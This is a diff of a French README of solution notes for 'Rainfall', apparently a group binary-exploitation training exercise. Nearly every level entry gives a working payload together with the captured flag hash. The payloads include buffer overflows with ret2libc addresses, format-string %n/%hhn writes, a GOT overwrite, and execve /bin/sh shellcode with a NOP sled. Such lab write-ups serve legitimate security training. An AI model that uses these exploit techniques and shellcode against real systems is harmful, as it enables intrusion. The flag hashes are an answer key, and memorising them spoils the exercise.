@@ -3,291 +3,18 @@ Rainfall
 
 Projet de groupe realise avec Don-Chinjao.
 
-Notes personnelles de resolution, structurees par niveau.
 
-Sommaire :
 
-- level0
-- level1
-- level2
-- level3
-- level4
-- level5
-- level6
-- level7
-- level8
-- level9
-- bonus0
-- bonus1
-- bonus2
-- bonus3
-
-Vue structuree
---------------
-
-level0
-
-- Flag :
-
-```text
-1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
-```
-
-level1
-
-- Payload note :
-
-```sh
-python2 -c 'import struct; import sys; sys.stdout.write("A"*
-```
-
-- Flag :
-
-```text
-53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
-```
-
-level2
-
-- Payload :
-
-```sh
-python2 -c 'import struct; print("A"*76 + "B"*4 + struct.pack("<I",0x0804853e) + struct.pack("<I",0xb7e6b060) + struct.pack("<I",0x41414141) + struct.pack("<I",0xb7f8cc58))' > /tmp/1
-```
-
-- Flag :
-
-```text
-492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
-```
-
-level3
-
-- Payload format string :
-
-```sh
-python2 -c 'import struct; print(struct.pack("<I", 0x804988c) + "a"*4 + "%56c%4$n")
-```
-
-- Flag :
-
-```text
-b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
-```
-
-level4
-
-- Tests / payloads :
-
-```sh
-ex:level4@RainFall:~$ python2 -c 'import struct; print(struct.pack("<I", 0x8049810) + "%60c%12$n" )' > /tmp/3
-```
-
-```sh
-python2 -c 'import struct; print(struct.pack("<I", 0x8049810) + struct.pack("<I", 0x8049811) + struct.pack("<I", 0x8049812) + struct.pack("<I", 0x8049813) + "%52c%12$hhn"+ "%17c%13$hhn" + "%173c%14$hhn" + "%255c%15$hhn")' > /tmp/3
-```
-
-- Flag :
-
-```text
-0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
-```
-
-level5
-
-- Adresse utile :
-
-```text
-0x080484a4
-```
-
-- Payload :
-
-```sh
-python -c 'import struct; print(struct.pack("<I", 0xbffff58c) + struct.pack("<I", 0xbffff58c+1) + struct.pack("<I", 0xbffff58c+2) + struct.pack("<I", 0xbffff58c+3) + "%148c%4$hhn"  + "%224c%5$hhn" + "%128c%6$hhn" + "%4c%7$hhn")' > /tmp/5
-```
-
-- Flag :
-
-```text
-d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
-```
-
-level6
-
-- Payload :
-
-```sh
-./level6 $(python -c 'import struct; import sys; sys.stdout.write("a"*72 + struct.pack("<I", 0x08048454))')
-```
-
-- Flag :
-
-```text
-f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
-```
-
-level7
-
-- Debug / tests :
-
-```sh
-gdb -q ./level7 -ex 'b main' -ex "run 1 1" -ex 'set {char[22]} 0x80486eb = "/tmp/1\0"' -ex 'x/s 0x80486eb'
-```
-
-```sh
-run "$(cat /tmp/arg1)" "$(cat /tmp/arg2)"
-```
-
-- Idee :
-
-```text
-solution: write in puts@got.plt
-```
-
-- Flag :
-
-```text
-5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
-```
-
-level8
-
-- Notes :
-
-```text
-spam service xD
-if *(auth + (0x20)) == NULL == pass
-```
-
-- Flag :
-
-```text
-c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
-```
-
-level9
-
-- Payload :
-
-```sh
-r $(python -c 'import struct; print("a"*104 + struct.pack("<I",0xb7d86060)  + struct.pack("<I", 0x804a074))')
-```
-
-- Flag :
-
-```text
-f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
-```
-
-- Commande finale :
-
-```sh
-./level9 $(python -c 'import struct; print("a"*104 + struct.pack("<I",0xb7d86060)  + struct.pack("<I", 0x804a074) + ";sh")')
-```
-
-bonus0
-
-- Tests / payloads :
-
-```sh
-r < <(cat /tmp/0; cat /tmp/1 -)
-```
-
-```sh
-bonus0@RainFall:~$ python -c 'import sys; import struct; sys.stdout.write("b" + "cccc" + "dddd" + "eeee" + "a" + struct.pack("<I", 0xb7e6b060) + "b" + "\n" + "abcd" + "\n")' > /tmp/1
-```
-
-```sh
-echo -e "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" > /tmp/shellcode.bin                                                                     export Z=$(cat /tmp/shellcode.bin)
-```
-
-- Flag :
-
-```text
-cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
-```
-
-- Autres essais / commande finale :
-
-```sh
-bonus0@RainFall:~$ python -c 'import sys; import struct; sys.stdout.write(";echo ok" + 6*"a" + struct.pack("<I", 0xbffffdb0) + ";" + "\n" + ";sh\x00")' > /tmp/1
-```
-
-```sh
-python -c 'import sys; sys.stdout.write("\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")' > /tmp/shellcode.bin
-```
-
-```sh
-bonus0@RainFall:~$ (cat /tmp/0; cat /tmp/1 -) | ./bonus0
-```
-
-bonus1
-
-- Tests / payloads :
-
-```sh
-r -4294967260 $(python -c 'import sys; sys.stdout.write("A"*32 + "FLOW")')
-```
-
-- Flag :
-
-```text
-579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
-```
-
-```sh
-./bonus1 -2147483637 $(python -c 'import sys; sys.stdout.write("A"*40 + "FLOW")')
-```
-
-bonus2
-
-- Payload :
-
-```sh
-./bonus2 $(python -c 'import sys; sys.stdout.write("B"*40)') $(python -c 'import sys; import struct; sys.stdout.write("A"*23 + struct.pack("<I", 0xbffffdcd))')
-```
-
-- Note :
-
-```text
-env exploit again
-```
-
-- Flag :
-
-```text
-71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
-```
-
-bonus3
-
-- Flag :
-
-```text
-3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
-```
-
-- Payload :
-
-```sh
-./bonus3 ""
-```
-
-- Note :
-
-```text
-macro method
-```
-
-Archive brute conservee
------------------------
+level0:
+-------
 
 423
-level0:
+
 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
 
+
 level1:
+-------
 
 python2 -c 'import struct; import sys; sys.stdout.write("A"*
 
@@ -295,6 +22,7 @@ python2 -c 'import struct; import sys; sys.stdout.write("A"*
 
 
 level2:
+-------
 
 python2 -c 'import struct; print("A"*76 + "B"*4 + struct.pack("<I",0x0804853e) + struct.pack("<I",0xb7e6b060) + struct.pack("<I",0x41414141) + struct.pack("<I",0xb7f8cc58))' > /tmp/1
 
@@ -302,80 +30,118 @@ python2 -c 'import struct; print("A"*76 + "B"*4 + struct.pack("<I",0x0804853e) +
 
 
 level3:
+-------
 
 python2 -c 'import struct; print(struct.pack("<I", 0x804988c) + "a"*4 + "%56c%4$n")
+
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 
+
 level4:
+-------
 
 ex:level4@RainFall:~$ python2 -c 'import struct; print(struct.pack("<I", 0x8049810) + "%60c%12$n" )' > /tmp/3
 
 python2 -c 'import struct; print(struct.pack("<I", 0x8049810) + struct.pack("<I", 0x8049811) + struct.pack("<I", 0x8049812) + struct.pack("<I", 0x8049813) + "%52c%12$hhn"+ "%17c%13$hhn" + "%173c%14$hhn" + "%255c%15$hhn")' > /tmp/3
+
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 
+
 level5:
+-------
+
 0x080484a4
 
- python -c 'import struct; print(struct.pack("<I", 0xbffff58c) + struct.pack("<I", 0xbffff58c+1) + struct.pack("<I", 0xbffff58c+2) + struct.pack("<I", 0xbffff58c+3) + "%148c%4$hhn"  + "%224c%5$hhn" + "%128c%6$hhn" + "%4c%7$hhn")' > /tmp/5
+python -c 'import struct; print(struct.pack("<I", 0xbffff58c) + struct.pack("<I", 0xbffff58c+1) + struct.pack("<I", 0xbffff58c+2) + struct.pack("<I", 0xbffff58c+3) + "%148c%4$hhn"  + "%224c%5$hhn" + "%128c%6$hhn" + "%4c%7$hhn")' > /tmp/5
 
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 
+
 level6:
+-------
 
 ./level6 $(python -c 'import struct; import sys; sys.stdout.write("a"*72 + struct.pack("<I", 0x08048454))')
 
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 
+
 level7:
+-------
+
 gdb -q ./level7 -ex 'b main' -ex "run 1 1" -ex 'set {char[22]} 0x80486eb = "/tmp/1\0"' -ex 'x/s 0x80486eb'
-run "$(cat /tmp/arg1)" "$(cat /tmp/arg2)" 
+
+run "$(cat /tmp/arg1)" "$(cat /tmp/arg2)"
+
 solution: write in puts@got.plt
+
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 
-./level8:
+
+level8:
+-------
 
 spam service xD
-if *(auth + (0x20)) == NULL == pass
-c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a 
 
-./level9:
+if *(auth + (0x20)) == NULL == pass
+
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
+
+level9:
+-------
 
 r $(python -c 'import struct; print("a"*104 + struct.pack("<I",0xb7d86060)  + struct.pack("<I", 0x804a074))')
+
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 
 ./level9 $(python -c 'import struct; print("a"*104 + struct.pack("<I",0xb7d86060)  + struct.pack("<I", 0x804a074) + ";sh")')
 
 
 bonus0:
-
+-------
 
 r < <(cat /tmp/0; cat /tmp/1 -)
+
 bonus0@RainFall:~$ python -c 'import sys; import struct; sys.stdout.write("b" + "cccc" + "dddd" + "eeee" + "a" + struct.pack("<I", 0xb7e6b060) + "b" + "\n" + "abcd" + "\n")' > /tmp/1
 
-echo -e "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" > /tmp/shellcode.bin                                                                     export Z=$(cat /tmp/shellcode.bin)       
+echo -e "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" > /tmp/shellcode.bin
 
+export Z=$(cat /tmp/shellcode.bin)
 
 cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
-bonus0@RainFall:~$ python -c 'import sys; import struct; sys.stdout.write(";echo ok" + 6*"a" + struct.pack("<I", 0xbffffdb0) + ";" + "\n" + ";sh\x00")' > /tmp/1                                                   
 
+bonus0@RainFall:~$ python -c 'import sys; import struct; sys.stdout.write(";echo ok" + 6*"a" + struct.pack("<I", 0xbffffdb0) + ";" + "\n" + ";sh\x00")' > /tmp/1
 
-python -c 'import sys; sys.stdout.write("\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")' > /tmp/shellcode.bin  
-bonus0@RainFall:~$ (cat /tmp/0; cat /tmp/1 -) | ./bonus0        
+python -c 'import sys; sys.stdout.write("\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")' > /tmp/shellcode.bin
+
+bonus0@RainFall:~$ (cat /tmp/0; cat /tmp/1 -) | ./bonus0
 
 
 bonus1:
-r -4294967260 $(python -c 'import sys; sys.stdout.write("A"*32 + "FLOW")') 
-579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
-./bonus1 -2147483637 $(python -c 'import sys; sys.stdout.write("A"*40 + "FLOW")') 
+-------
 
-bonus:2
+r -4294967260 $(python -c 'import sys; sys.stdout.write("A"*32 + "FLOW")')
+
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
+./bonus1 -2147483637 $(python -c 'import sys; sys.stdout.write("A"*40 + "FLOW")')
+
+
+bonus2:
+-------
+
 ./bonus2 $(python -c 'import sys; sys.stdout.write("B"*40)') $(python -c 'import sys; import struct; sys.stdout.write("A"*23 + struct.pack("<I", 0xbffffdcd))')
+
 env exploit again
+
 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
 
 
 bonus3:
+-------
+
 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+
 ./bonus3 ""
 
 macro method
